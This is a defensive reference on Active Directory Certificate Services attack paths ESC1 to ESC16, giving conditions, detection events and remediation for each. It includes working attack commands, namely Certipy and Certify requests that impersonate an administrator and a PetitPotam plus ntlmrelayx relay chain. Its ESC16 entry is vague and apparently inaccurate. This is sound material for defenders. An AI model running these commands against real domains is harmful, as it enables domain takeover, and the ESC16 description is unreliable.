# AD CS vulnerability reference (ESC1-ESC16)

Complete documentation of Active Directory Certificate Services attack paths: exploitation conditions, detection, and remediation.

---

## ESC1 -- Misconfigured Certificate Templates (SAN abuse)

**Severity:** Critical

**Conditions required:**
1. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set (enrollee supplies SAN in request).
2. Low-privileged users have Enrol rights on the template.
3. Template has Client Authentication EKU (or any EKU enabling authentication).
4. No manager approval required.

**Exploitation:**

```bash
# Using Certipy
certipy req -u lowpriv@example.com -p 'Password' -ca 'CORP-CA' \
    -template 'VulnerableTemplate' -upn 'administrator@example.com'

# Using Certify (Windows)
Certify.exe request /ca:CA01.example.com\CORP-CA /template:VulnerableTemplate \
    /altname:administrator
```

The attacker requests a certificate with the administrator's UPN in the SAN. The CA issues it. The attacker uses it for Kerberos PKINIT authentication as the administrator.

**Detection:**

- Event 4887 (certificate issued): check for certificates where the SAN does not match the requester identity.
- Monitor for Certify/Certipy execution via process creation logging.
- Audit template configurations with `Certify.exe find /vulnerable` or `certipy find`.

**Remediation:**

1. Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from the template.
2. If SAN supply is required: enable CA Manager Approval (`CT_FLAG_PEND_ALL_REQUESTS`).
3. Restrict enrolment permissions to only the required groups.
4. Enable certificate request auditing (Events 4886/4887).

---

## ESC2 -- Misconfigured Certificate Templates (Any Purpose EKU)

**Severity:** Critical

**Conditions required:**
1. EKU set to "Any Purpose" (OID `2.5.29.37.0`) or no EKU at all.
2. Low-privileged users have Enrol rights.

**Exploitation:** A certificate with "Any Purpose" EKU can be used for client authentication, code signing, or any other purpose. No-EKU certificates are treated as valid for any purpose by many implementations. The attacker enrols and uses the certificate for PKINIT.

**Remediation:**

1. Set a specific EKU (for example, Client Authentication only).
2. Remove the "Any Purpose" OID.
3. Restrict enrolment permissions.

---

## ESC3 -- Enrolment Agent Misuse

**Severity:** High

**Conditions required:**
1. Template A has "Certificate Request Agent" EKU and low-privileged enrolment.
2. Template B allows enrolment on behalf of others (enrolment agent) with Client Auth EKU.
3. No restrictions on which enrolment agents can enrol for which users on which templates.

**Exploitation:**

1. Attacker enrols in Template A to obtain an enrolment agent certificate.
2. Attacker uses the enrolment agent certificate to request a certificate from Template B on behalf of a privileged user.

**Remediation:**

1. Restrict enrolment permissions on enrolment agent templates.
2. Configure "Restrict Enrollment Agents" on the CA: limit which enrolment agents can enrol for which templates and which target users/groups.
3. Enable manager approval on templates that allow enrolment on behalf.

```powershell
# Configure enrolment agent restrictions on CA
# CA Properties > Enrollment Agents tab
# Restrict by: enrolment agent certificate, certificate template, and target user/group
```

---

## ESC4 -- Vulnerable Certificate Template ACLs

**Severity:** Critical

**Conditions required:** Low-privileged users have Write permissions on a certificate template object in AD (for example, `WriteDacl`, `WriteOwner`, `GenericAll`, `GenericWrite`, or write access to specific PKI attributes).

**Exploitation:**

1. Attacker modifies the template to introduce ESC1 conditions (add `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, set EKU to Client Auth, remove manager approval).
2. Attacker exploits the modified template as ESC1.
3. Optionally, attacker reverts the template to cover tracks.

**Detection:**

- Event 4899 (certificate template updated): alert on all template modifications.
- Audit ACLs on certificate template objects in AD regularly.

**Remediation:**

1. Audit template ACLs: remove Write permissions for non-admin groups.
2. Only Enterprise Admins and Domain Admins should have Write on templates.
3. Monitor Event 4899 for unauthorised template modifications.

---

## ESC5 -- Vulnerable PKI AD Object ACLs

**Severity:** High

**Conditions required:** Low-privileged users have Write permissions on PKI-related AD objects:

- CA computer object.
- CA's RPC/DCOM server object.
- `CN=Public Key Services` container or child objects in `CN=Configuration`.
- `CN=NTAuthCertificates` object.

**Exploitation:** Attacker modifies PKI AD objects to enable certificate-based attacks. For example, adding a rogue CA certificate to NTAuthCertificates enables trust of certificates issued by an attacker-controlled CA.

**Remediation:**

1. Audit ACLs on all objects under `CN=Public Key Services,CN=Services,CN=Configuration`.
2. Restrict Write permissions to PKI administrators only.
3. Monitor changes to the NTAuthCertificates object via SACL auditing.

---

## ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2

**Severity:** Critical

**Condition:** The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which allows any certificate request to specify a SAN regardless of template settings.

```powershell
# Detection: check if flag is enabled
certutil -config "CA01\CORP-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
```

**Exploitation:** Even templates without `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` accept SAN values in the request when this CA flag is enabled. All published templates are effectively ESC1-vulnerable.

**Remediation:**

```powershell
# Disable the flag
certutil -config "CA01\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service certsvc
```

---

## ESC7 -- Vulnerable CA ACLs

**Severity:** Critical

**Conditions:** Low-privileged users have dangerous permissions on the CA itself:

- `ManageCA`: can modify CA configuration (can enable ESC6 or add officers).
- `ManageCertificates`: can approve pending certificate requests.

**Exploitation (ManageCA):**

1. Attacker uses ManageCA to enable `EDITF_ATTRIBUTESUBJECTALTNAME2` (creates ESC6).
2. Or attacker adds themselves as a CA officer to approve requests.

**Exploitation (ManageCertificates):**

1. Attacker submits a request to a template requiring manager approval.
2. Attacker approves their own request using ManageCertificates permission.

**Detection and remediation:**

```powershell
# Audit CA ACLs
certutil -config "CA01\CORP-CA" -getacl

# Remove ManageCA and ManageCertificates from non-admin groups
# Only PKI Admins should have CA management permissions
```

---

## ESC8 -- NTLM Relay to AD CS HTTP Endpoints

**Severity:** Critical

**Conditions:** Certificate enrolment web endpoints (certsrv, CES) are accessible via HTTP (not HTTPS only) and do not enforce Extended Protection for Authentication (EPA).

**Exploitation:**

```bash
# Step 1: Coerce machine account authentication (PetitPotam)
python3 PetitPotam.py -d example.com -u user -p pass attacker_ip dc_ip

# Step 2: Relay NTLM to CA HTTP web enrolment
ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

The attacker coerces a machine account (for example, a domain controller) to authenticate via NTLM, relays that authentication to the HTTP CA enrolment endpoint, and obtains a certificate as the machine account. The attacker then uses the DC certificate for PKINIT authentication as the DC.

**Remediation:**

1. Disable HTTP enrolment endpoints; use HTTPS only.
2. Enable Extended Protection for Authentication (EPA) on the IIS site hosting certsrv.
3. Disable NTLM authentication on the CA web enrolment site.
4. Better: disable web enrolment entirely if not needed; use auto-enrolment instead.
5. Mitigate coercion: disable the Print Spooler service on DCs; apply patches for PetitPotam (CVE-2021-36942) and related coercion vulnerabilities.

---

## ESC9 -- CT_FLAG_NO_SECURITY_EXTENSION

**Severity:** High

**Condition:** Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag set (`msPKI-Enrollment-Flag` bit `0x00080000`). This prevents the `szOID_NTDS_CA_SECURITY_EXT` extension from being embedded in issued certificates.

**Impact:** Without the security extension, the certificate lacks the mapping information needed for strong certificate mapping (KB5014754). An attacker who can modify a user's `userPrincipalName` or `dNSHostName` can obtain a certificate that maps to a different account under weak mapping.

**Remediation:**

1. Remove `CT_FLAG_NO_SECURITY_EXTENSION` from the template's enrolment flags.
2. Enforce strong certificate mapping on all DCs (`StrongCertificateBindingEnforcement = 2`).

---

## ESC10 -- Weak Certificate Mapping

**Severity:** High

**Conditions:**

- Registry: `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement = 0` (disabled).
- Or `CertificateMappingMethods` includes weak methods (0x0004 UPN mapping, 0x0008 S4U2Self).

**Exploitation:** Attacker obtains a certificate for one account and uses weak mapping to authenticate as another account. Typically combined with the ability to modify UPN or DNS host name attributes.

**Remediation:**

1. Set `StrongCertificateBindingEnforcement = 2` (full enforcement) on all DCs.
2. Remove weak certificate mapping methods from `CertificateMappingMethods`.
3. Deploy KB5014754 and move from compatibility mode to enforcement mode.

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name StrongCertificateBindingEnforcement -Value 2
```

---

## ESC11 -- NTLM Relay to AD CS ICPR (RPC)

**Severity:** High

**Condition:** The CA's RPC interface (ICertPassage Remote, MS-ICPR) does not enforce signing.

**Exploitation:** Similar to ESC8 but relays NTLM authentication to the RPC enrolment interface instead of HTTP.

```powershell
# Detection: check if CA enforces RPC signing
certutil -config "CA01\CORP-CA" -getreg CA\InterfaceFlags
# Check for IF_ENFORCEENCRYPTICERTREQUEST (0x00000200)
```

**Remediation:**

```powershell
# Enable RPC signing enforcement
certutil -config "CA01\CORP-CA" -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
Restart-Service certsvc
```

---

## ESC12 -- CA with YubiHSM key in registry

**Severity:** Medium

**Condition:** CA uses a YubiHSM hardware security module, and the YubiHSM authentication key is stored in plaintext in the registry at `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

**Exploitation:** Attacker with local admin on the CA reads the authentication key from the registry and uses it to operate the HSM directly, potentially accessing the CA private key.

**Remediation:**

1. Restrict local admin access to CA servers (Tier 0 treatment).
2. Use YubiHSM authentication key encryption features if available.
3. Monitor registry access on the CA via SACL auditing.

---

## ESC13 -- Issuance Policy OID Group Link

**Severity:** High

**Condition:** A certificate template is configured with an issuance policy that has an OID group link (`msDS-OIDToGroupLink`) pointing to a group. Enrolling in the template effectively grants membership in the linked group upon authentication.

**Exploitation:** Attacker enrols in the template and obtains an authentication certificate. When authenticating, the issuance policy OID maps to the linked group, granting the attacker the group's permissions.

**Remediation:**

1. Audit `msDS-OIDToGroupLink` on all OID objects in `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`.
2. Remove unnecessary OID-to-group links.
3. Restrict enrolment on templates with issuance policies that have group links.

---

## ESC14 -- Weak Explicit Certificate Mapping

**Severity:** High

**Condition:** An attacker has Write access to a user's `altSecurityIdentities` attribute (or other attributes used for certificate mapping) and can modify it to map a certificate they control to the target account.

**Exploitation:** Attacker writes a mapping string for their own certificate to the victim's `altSecurityIdentities`, then authenticates as the victim using that certificate.

**Remediation:**

1. Audit Write permissions on `altSecurityIdentities` across all user objects.
2. Enforce strong certificate mapping (full enforcement, not compatibility mode).
3. Monitor changes to `altSecurityIdentities` via SACL auditing on user objects.

---

## ESC15 -- Application Policy in Schema v1 Templates

**Severity:** Medium

**Condition:** Schema version 1 certificate templates use the Application Policy extension (instead of EKU) to specify allowed uses. Some implementations do not properly validate Application Policy, allowing certificates to be used beyond their intended purpose.

**Remediation:**

1. Upgrade schema v1 templates to schema v2 or later.
2. Ensure EKU (not only Application Policy) is properly configured on all templates.
3. Test certificate validation behaviour in your environment across all relying parties.

---

## ESC16 -- Extended Schema v1 Issues

**Severity:** Medium

**Condition:** Additional schema v1 template interpretation issues across different Windows versions and certificate validation implementations, similar in nature to ESC15.

**Remediation:**

1. Migrate all templates from schema v1 to v2+.
2. Audit certificate validation across all relying parties.
3. Apply the latest Windows security updates (KB5014754 and related).

---

## Comprehensive detection strategy

### Proactive scanning (run monthly minimum)

```bash
# Certipy: comprehensive AD CS audit
certipy find -u auditor@example.com -p 'AuditPass' -dc-ip 10.0.0.1 -vulnerable -stdout

# Certify: Windows-native C# tool
Certify.exe find /vulnerable /currentuser

# Locksmith (PowerShell)
Import-Module Locksmith
Invoke-Locksmith -Mode 2   # Full audit with remediation steps

# PSPKIAudit (PowerShell)
Import-Module PSPKIAudit
Invoke-PKIAudit
```

### Event-based detection

| Event | Monitor for |
|---|---|
| 4886 + 4887 | Unusual certificate requests (unexpected templates, unexpected requesters) |
| 4887 with SAN mismatch | Certificate issued where SAN does not match the requester's identity |
| 4899 | Template modifications (especially enrolment flags, subject name flags) |
| CA audit logs | ManageCA or ManageCertificates operations by non-PKI admins |
| Directory Service changes | Modifications to `CN=Public Key Services` objects, NTAuthCertificates |

### Continuous monitoring

- Integrate AD CS events into SIEM (Splunk, Microsoft Sentinel, Elastic).
- Create alerts for ESC1/ESC4/ESC6/ESC7/ESC8 indicators.
- Track new certificate template publications (Event 4898).
- Monitor for NTLM coercion attacks (PetitPotam, PrinterBug) as ESC8 precursors.
- Review `altSecurityIdentities` changes for ESC14 indicators.
